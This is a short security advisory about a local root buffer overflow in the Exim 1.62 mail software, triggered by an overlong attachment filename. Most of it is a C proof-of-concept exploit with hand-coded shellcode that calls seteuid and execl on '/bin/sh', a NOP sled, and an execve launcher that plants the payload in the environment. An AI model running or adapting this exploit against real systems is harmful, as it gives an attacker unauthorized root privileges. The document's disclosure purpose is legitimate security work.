source: http://www.securityfocus.com/bid/1859/info

A potential local root yielding buffer overflow vulnerability exists in Exim mail client version 1.62. 

A buffer used in processing filenames of message attachments can be overflowed by a maliciously-formed filename. As a result, the excessive data copied onto the stack can overwrite critical parts of the stack frame such as the calling functions' return address. Since this data is supplied by the user it can be a crafted so that alter the program's flow of execution. If properly exploited, this can yield root privilege to the attacker.

/* sample code for one OS/compiler combination; ./this ./exim -bt you */

char code[] = {
0x31,0xc0 /* eax = 0 */
, 0x50 /* push eax */
, 0xbb,0x98,0x30,0x04,0x00 /* ebx = 0x43098; &seteuid in my copy of exim */
, 0xff,0xd3 /* call ebx */
, 0x31,0xc0
, 0x50
, 0xb8,0x9a,0xd1,0x03,0x00 /* eax = 0x3d19a; &"/bin/sh" in my copy of exim */
, 0x50
, 0x50
, 0xbb,0xf8,0x29,0x04,0x00 /* ebx = 0x429f8; &execl in my copy of exim */
, 0xff,0xd3
, 0x00 /* just to terminate the last string in the environment */
} ;

char buf[1000];
char *env[1001];

void main(argc,argv)
int argc;
char **argv;
{
int i;
int j;

for (i = 0;i < sizeof buf;++i) buf[i] = 0x90; /* nop */
memcpy(buf + sizeof buf - sizeof code,code,sizeof code);

j = 0;
env[0] = buf;
for (i = 0;i < sizeof buf;++i) if (!buf[i]) env[++j] = buf + i + 1;
env[j] = 0;

if (argv[1]) execve(argv[1],argv + 1,env);
exit(1);
}